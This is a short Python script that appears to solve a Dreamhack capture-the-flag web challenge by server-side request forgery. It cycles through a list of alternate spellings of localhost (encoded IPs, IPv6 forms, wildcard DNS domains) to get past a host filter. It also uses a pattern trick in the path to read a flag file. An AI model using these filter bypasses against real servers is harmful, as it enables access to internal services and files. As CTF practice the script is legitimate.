import requests
import re
from bs4 import BeautifulSoup

url = "http://host3.dreamhack.games:16197"

internal = [
    '::',
    'localhost',
    '127.0.0.1',
    '0.0.0.0',
    '0000::1',
    '0:0:0:0:0:ffff:127.0.0.1',
    '::ffff:127.0.0.1',
    '0',
    '127.1',
    '2130706433',
    '0x7f000001',
    '017700000001',
    '::1',
    '0:0:0:0:0:0:0:1',
    'LOCALHOST',
    'localhost.',
    'lvh.me',
    'localtest.me',
    'localh.st',
    'sslip.io',
    '127.0.0.1.sslip.io',
    'company.127.0.0.1.nip.io'
]

data = {
    'host': 'DUMMY',
    'port': '8080',
    'path': 'api/read?filename=/fla[g][--0]txt'
}

proxies = {
    'http': 'http://localhost:8080',
    'https': 'http://localhost:8080'
}

for val in internal:
    data['host'] = val
    try:
        req = requests.post(url=url + '/request', proxies=proxies, data=data, timeout=5)
        if req.status_code in [500, 403]:
            continue
        soup = BeautifulSoup(req.text, features='html.parser')
        results = soup.find_all(string=re.compile(r"DH\{"))
        if results:
            print(results[0])
            break
    except Exception as e:
        print(e)

